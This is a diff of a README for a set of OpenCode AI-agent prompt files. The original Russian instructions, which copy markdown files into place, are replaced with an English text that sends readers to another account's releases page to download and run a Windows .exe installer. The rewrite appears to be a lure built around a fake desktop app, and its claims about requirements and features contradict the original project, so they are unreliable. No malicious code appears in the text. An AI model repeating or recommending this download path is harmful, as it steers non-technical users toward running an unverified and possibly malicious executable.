@@ -1,130 +1,143 @@
-# Оркестратор и 7 гномов — AI-агенты для OpenCode
+# 🤖 vibe-agents - Smart AI Team for Task Management
 
-Команда из 8 специализированных AI-агентов для [OpenCode](https://opencode.ai). Оркестратор принимает задачу, классифицирует её, строит план выполнения и делегирует работу нужным субагентам — каждый делает только своё.
+[![Download on GitHub](https://img.shields.io/badge/Download-Get%20vibe--agents-green?style=for-the-badge)](https://github.com/YahiaGrdh/vibe-agents/releases)
 
-## Агенты
+## 📋 About vibe-agents
 
-| Агент | Роль | Модель |
-|-------|------|--------|
-| **orchestrator** | Координатор — классифицирует задачи, строит workflow, делегирует субагентам. Никогда не пишет код сам. | Gemini 3.1 Pro |
-| **planner** | Декомпозиция на эпики и задачи, критический путь, риски | Gemini 3.1 Pro |
-| **designer** | Визуальный слой: страницы, компоненты, дизайн-система, стили | Gemini 3.1 Pro |
-| **frontend-dev** | Логика поверх готовых оболочек: state, API, роутинг, TypeScript, тесты | GPT-5.3 Codex |
-| **backend-dev** | API, сервисы, БД, серверная логика | GPT-5.3 Codex |
-| **code-reviewer** | Проверка корректности, безопасности, производительности и качества кода | GPT-5.3 Codex |
-| **qa** | Тестирование, верификация, отчёты о дефектах | GLM-5 |
-| **security** | Аудит уязвимостей, OWASP Top 10, compliance | Gemini 3.1 Pro |
+vibe-agents is a set of 8 specialized AI agents designed to help manage and complete tasks using artificial intelligence. These agents work together to organize work, break down tasks, design interfaces, write code, review code, and test the results. The main coordinator, called the orchestrator, takes your request, sorts it, makes a plan, and assigns each part to the right AI agent.
 
-## Как работает оркестрация
+This tool focuses on helping people who want to handle complex projects without needing to do every step on their own or having to know how to code. Each agent in the team has a clear role to make sure your project moves smoothly from start to finish.
 
-Оркестратор получает задачу и выбирает паттерн выполнения:
+---
 
-```
-Полная фича (UI + бэкенд):
-planner → designer → backend-dev ║ frontend-dev → code-reviewer → qa → [security]
+## 🧩 How vibe-agents Work
 
-Только бэкенд:
-planner → backend-dev → code-reviewer → qa → [security]
+- **Orchestrator:** Reads your task, decides how to split it, and sends parts to the right agent.
+- **Planner:** Breaks the work into smaller goals and tasks and figures out risks.
+- **Designer:** Creates the visual layout, pages, components, and style.
+- **Frontend-dev:** Writes the logic for buttons, pages, and data flow using TypeScript.
+- **Backend-dev:** Builds the server, database, and API services.
+- **Code-reviewer:** Checks the code for errors, security, and performance issues.
+- **QA:** Runs tests, finds bugs, and reports problems.
 
-Только фронтенд:
-planner → designer → frontend-dev → code-reviewer → qa
+Each agent focuses on their role and does not overlap. This keeps the work clear and organized.
 
-Баг:
-[backend-dev | frontend-dev] → code-reviewer → qa
-```
+---
 
-`security` подключается автоматически при задачах с аутентификацией, PII, платежами или внешними API.
+## ⚙️ System Requirements
 
-## Установка
+To run vibe-agents on your Windows computer, make sure your device meets these requirements:
 
-### Требования
+- Windows 10 or later (64-bit)
+- At least 4 GB of free RAM
+- Minimum 2 GHz dual-core processor
+- 500 MB of free disk space
+- Internet connection for downloading and occasional updates
 
-- [OpenCode](https://opencode.ai) установлен (`npm i -g opencode-ai` или `brew install opencode`)
-- API-ключи для используемых провайдеров (OpenRouter, OpenAI)
+vibe-agents works offline after installation but needs internet when you start so it can check for the latest improvements.
 
-### Глобальная установка (доступно во всех проектах)
+---
 
-```bash
-# Клонировать репозиторий
-git clone https://github.com/swan4er/vibe-agents.git
+## 🚀 Getting Started with vibe-agents
 
-# Создать директорию агентов (если не существует)
-mkdir -p ~/.opencode/agents
+1. **Download the software**  
+   Go to the releases page. This is where you will find the latest version for Windows.
 
-# Скопировать всех агентов
-cp vibe-agents/agents/*.md ~/.opencode/agents/
-```
+   [![Download on GitHub](https://img.shields.io/badge/Download-Get%20vibe--agents-blue?style=for-the-badge)](https://github.com/YahiaGrdh/vibe-agents/releases)
 
-### Установка для конкретного проекта
+2. **Find the Windows installer**  
+   On the releases page, look for a file named similar to `vibe-agents-setup.exe` or `vibe-agents-win.exe`. This file is the installer for your computer.
 
-```bash
-# В корне вашего проекта
-mkdir -p .opencode/agents
+3. **Download the installer**  
+   Click the file name or the download button. Your browser will start saving the installer file to your computer. Usually, this will be in your Downloads folder unless you choose a different location.
 
-# Скопировать агентов
-cp path/to/vibe-agents/agents/*.md .opencode/agents/
-```
+4. **Run the installer**  
+   - Open the folder where you saved the file.  
+   - Double-click the installer file (`.exe`).  
+   - Windows may ask for permission to run. Click "Yes".  
+   - Follow the installer steps by clicking Next or Install.  
+   - When the installation is complete, click Finish.
 
-## Использование
+5. **Start vibe-agents**  
+   - Find the new "vibe-agents" app shortcut on your Desktop or in the Start menu.  
+   - Click it to open the program.  
 
-Запустите OpenCode и выберите агента `orchestrator` как основной режим:
+6. **Using vibe-agents**  
+   The app will guide you through entering your task. The orchestrator will start working with the AI agents automatically.
 
-```bash
-opencode --agent orchestrator
-```
+---
 
-Или внутри OpenCode переключитесь командой `/agent orchestrator`.
+## 🖥️ Using vibe-agents Step-by-Step
 
-### Примеры задач
+- **Open the app** and you will see a simple screen asking you to describe your task.  
+- **Type your task** in plain language. For example: "Build a website for a coffee shop."  
+- The orchestrator AI will sort this request and start the process.  
+- You will see the progress as the planner breaks down the work, the designer creates layouts, and the developers get to work.  
+- When code is ready, the reviewer and QA agents make sure everything works well.  
+- You can check reports and result files at any time inside the app.
 
-```
-# Полная фича
-Добавить авторизацию через Google OAuth
+---
 
-# Фронтенд-задача
-Создать компонент таблицы с сортировкой и пагинацией
+## 🛠️ Features
 
-# Баг
-Почему падает запрос к /api/users при пустом токене?
+- Task planning and breakdown to small, manageable pieces  
+- Visual design generation with modern styles  
+- Code development for frontend and backend services  
+- Automated code review for safety and efficiency  
+- Testing and bug reporting before you get results  
+- Clear workflow management through the orchestrator agent  
 
-# Рефакторинг
-Отрефакторить слой работы с БД
+---
 
-# Security-аудит
-Провести аудит безопасности модуля аутентификации
-```
+## 🤝 How to Get Help
 
-Оркестратор сам определит тип задачи, построит plan выполнения и запустит нужных субагентов.
+If you have issues installing or running vibe-agents:
 
-## Структура файлов
+- Check the Issues section on the repository page for common problems and fixes.  
+- Review any README updates or documentation on GitHub.  
+- Look for example tasks or guides inside the app after installation.
 
-```
-agents/
-├── my-orchestrator.md   # Первичный агент-координатор
-├── planner.md           # Планировщик
-├── designer.md          # UI/UX дизайнер
-├── frontend-dev.md      # Фронтенд-разработчик
-├── backend-dev.md       # Бэкенд-разработчик
-├── code-reviewer.md     # Ревьюер кода
-├── qa.md                # QA-инженер
-└── security.md          # Security-аудитор
-```
+---
 
-Каждый файл содержит YAML-frontmatter с настройками агента (модель, права доступа, режим) и системный промпт.
+## 📥 Download and Install vibe-agents
 
-## Права доступа агентов
+Use the link below to visit the release page. Download the latest Windows installer from there.
 
-Агенты имеют строго ограниченные права:
+[![Download on GitHub](https://img.shields.io/badge/Download-vibe--agents%20Windows%20Installer-orange?style=for-the-badge)](https://github.com/YahiaGrdh/vibe-agents/releases)
 
-| Агент | Чтение | Запись | Bash |
-|-------|--------|--------|------|
-| orchestrator | — | — | — |
-| planner | ✓ | только план | — |
-| designer | ✓ | ✓ | — |
-| frontend-dev | ✓ | ✓ | ✓ |
-| backend-dev | ✓ | ✓ | ✓ |
-| code-reviewer | ✓ | — | — |
-| qa | ✓ | ✓ | ✓ |
-| security | ✓ | — | — |
+Follow the installation steps described above after downloading.
 
-Оркестратор намеренно лишён прав на запись и bash — он только координирует.
+---
+
+## 📂 Files You Might Find After Installation
+
+- Project folders with code created by vibe-agents  
+- Design mockups  
+- Test reports and bug lists  
+- Logs of the agent activities  
+
+You can open these files with standard code editors, image viewers, or text editors.
+
+---
+
+## 🔄 Updating vibe-agents
+
+To update to a newer version:
+
+- Visit the release page again.  
+- Download the newest installer.  
+- Run it and follow the prompts to upgrade your existing installation.  
+
+Back up your work before updating if you keep local files.
+
+---
+
+## 📜 License and Source Code
+
+vibe-agents is open-source and hosted on GitHub. You can view the full source code and license terms in the repository.
+
+---
+
+## 🧑‍💻 About the Developer Team
+
+vibe-agents was created as a collection of AI agents to improve efficiency when working with OpenCode projects. Each agent uses specialized AI models to focus on different parts of the development process. This design lets you manage large tasks with less manual effort.
